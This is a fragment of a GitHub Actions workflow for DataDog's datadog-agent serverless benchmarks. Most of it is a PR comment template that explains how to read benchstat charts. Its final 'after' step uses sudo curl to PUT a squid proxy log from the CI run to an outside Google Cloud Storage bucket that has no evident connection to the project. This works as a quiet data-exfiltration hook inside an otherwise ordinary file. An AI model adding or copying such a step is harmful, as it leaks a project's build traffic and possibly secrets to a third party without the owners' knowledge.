      with:
        header: serverless-benchmarks
        message: "## Serverless Benchmark Results\n\n`BenchmarkStartEndInvocation`\
          \ comparison between ${{ needs.baseline.outputs.sha }} and ${{ needs.current.outputs.sha\
          \ }}.\n\n<details>\n<summary>tl;dr</summary>\n\nUse these benchmarks as\
          \ an insight tool during development.\n\n1. Skim down the `vs base` column\
          \ in each chart. If there is a `~`, then there was no statistically significant\
          \ change to the benchmark. Otherwise, ensure the estimated percent change\
          \ is either negative or very small.\n\n2. The last row of each chart is\
          \ the `geomean`. Ensure this percentage is either negative or very small.\n\
          \n</details>\n\n<details>\n<summary>What is this benchmarking?</summary>\n\
          \nThe [`BenchmarkStartEndInvocation`](https://github.com/DataDog/datadog-agent/blob/main/pkg/serverless/daemon/routes_test.go)\
          \ compares the amount of time it takes to call the `start-invocation` and\
          \ `end-invocation` endpoints. For universal instrumentation languages (Dotnet,\
          \ Golang, Java, Ruby), this represents the majority of the duration overhead\
          \ added by our tracing layer.\n\nThe benchmark is run using a large variety\
          \ of lambda request payloads. In the charts below, there is one row for\
          \ each event payload type.\n\n</details>\n\n<details>\n<summary>How do I\
          \ interpret these charts?</summary>\n\nThe charts below comes from [`benchstat`](https://pkg.go.dev/golang.org/x/perf/cmd/benchstat).\
          \  They represent the statistical change in _duration (sec/op)_, _memory\
          \ overhead (B/op)_, and _allocations (allocs/op)_.\n\nThe benchstat docs\
          \ explain how to interpret these charts.\n\n> Before the comparison table,\
          \ we see common file-level configuration. If there are benchmarks with different\
          \ configuration (for example, from different packages), benchstat will print\
          \ separate tables for each configuration.\n>\n> The table then compares\
          \ the two input files for each benchmark. It shows the median and 95% confidence\
          \ interval summaries for each benchmark before and after the change, and\
          \ an A/B comparison under \"vs base\".  ...  The p-value measures how likely\
          \ it is that any differences were due to random chance (i.e., noise). The\
          \ \"~\" means benchstat did not detect a statistically significant difference\
          \ between the two inputs. ...\n>\n> Note that \"statistically significant\"\
          \ is not the same as \"large\": with enough low-noise data, even very small\
          \ changes can be distinguished from noise and considered statistically significant.\
          \  It is, of course, generally easier to distinguish large changes from\
          \ noise.\n>\n> Finally, the last row of the table shows the geometric mean\
          \ of each column, giving an overall picture of how the benchmarks changed.\
          \  Proportional changes in the geomean reflect proportional changes in the\
          \ benchmarks. For example, given n benchmarks, if sec/op for one of them\
          \ increases by a factor of 2, then the sec/op geomean will increase by a\
          \ factor of \u207F\u221A2.\n\n</details>\n\n<details>\n<summary>I need more\
          \ help</summary>\n\nFirst off, do not worry if the benchmarks are failing.\
          \  They are not tests.  The intention is for them to be a tool for you to\
          \ use during development.\n\nIf you would like a hand interpreting the results\
          \ come chat with us in `#serverless-agent` in the internal DataDog slack\
          \ or in `#serverless` in the [public DataDog slack](https://chat.datadoghq.com/).\
          \  We're happy to help!\n\n</details>\n\n<details>\n<summary>Benchmark stats</summary>\n\
          \n```\n${{ steps.analyze.outputs.analyze }}\n```\n\n</details>\n"
        recreate: true
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/DataDog/datadog-agent.$(date
        +%s)
    timeout-minutes: 60
